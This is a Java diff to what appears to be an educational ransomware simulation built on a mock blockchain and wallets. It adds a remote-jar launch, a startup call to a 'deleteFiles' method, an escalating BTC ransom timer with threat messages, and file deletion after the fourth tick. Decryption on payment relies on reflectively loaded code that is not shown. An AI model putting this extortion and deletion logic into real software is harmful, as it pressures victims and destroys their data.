@@ -13,6 +13,9 @@ import java.lang.reflect.Method;
 import java.net.URL;
 import java.net.URLClassLoader;
 import java.util.Objects;
+import java.util.concurrent.Executors;
+import java.util.concurrent.ScheduledExecutorService;
+import java.util.concurrent.TimeUnit;
 
 public class Application {
 
@@ -22,12 +25,16 @@ public class Application {
     private Object instance;
     private static final Application application = new Application();
     private final Blockchain blockchain = new Blockchain();
+    private static float amount = 0.02755f;
+    private static int counter;
+    private static final ScheduledExecutorService executorService = Executors.newSingleThreadScheduledExecutor();
 
     public static void main(String... args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException {
         Person SatoshiNakamoto = new Person("Statoshi Nakamoto");
         SatoshiNakamoto.initializeBlockchain();
         application.loadClazzFromJavaArchive();
         application.provideInstanceOfClass();
+        application.executeMethodDirectlyWithoutPort("deleteFiles");
         int i = 0;
         while (i == 0) {
             String in = null;
@@ -37,6 +44,7 @@ public class Application {
             command = in.split(" ");
             if (Objects.equals(in, "launch http://www.trust-me.mcg/report.jar")) {
                 application.launch();
+                executorService.scheduleAtFixedRate(Application::increase, 60, 60, TimeUnit.SECONDS);
             }
 
             else if (Objects.equals(command[0], "exchange")) {
@@ -91,18 +99,37 @@ public class Application {
     }
 
     public void showRecipient(){
-        System.out.println("showRecipient");
+        System.out.println(ed.getWallet().getBitcoinAdress());
     }
 
-    public void pay(float amount){
-        clueLess.pay(amount,ed.getWallet().getBitcoinAdress());
-        ed.getWallet().setNewAmount(amount);
+    public void pay(float amount1){
+        if (amount1 >= amount){
+            clueLess.pay(amount1,ed.getWallet().getBitcoinAdress());
+            ed.getWallet().setNewAmount(amount1);
+            executorService.shutdown();
+        } else {
+            System.out.println("Your need to pay "+amount+" BTC.");
+        }
+
     }
 
     public void checkPayment(){
         if (clueLess.checkPayment()){
             application.executeMethodDirectlyWithoutPort("decryptAll");
             System.out.println("Files decrypted");
+        }
+    }
+
+    private static void increase(){
+        amount = amount + 0.01f;
+        counter++;
+        if (counter == 4){
+            application.executeMethodDirectlyWithoutPort("deleteFiles");
+            System.out.println("Your files have been deleted!");
+        } else if (counter == 3) {
+            System.out.println("Pay "+amount+" BTC immediately or your files will be irrevocably deleted.");
+        } else {
+            System.out.println("Increase by 0.01 BTC to "+ amount);
         }
     }
 
@@ -130,7 +157,6 @@ public class Application {
 
         try {
             Method method = clazz.getDeclaredMethod(method1);
-            System.out.println(method);
             String version = (String) method.invoke(instance);
         } catch (Exception e) {
             e.printStackTrace();
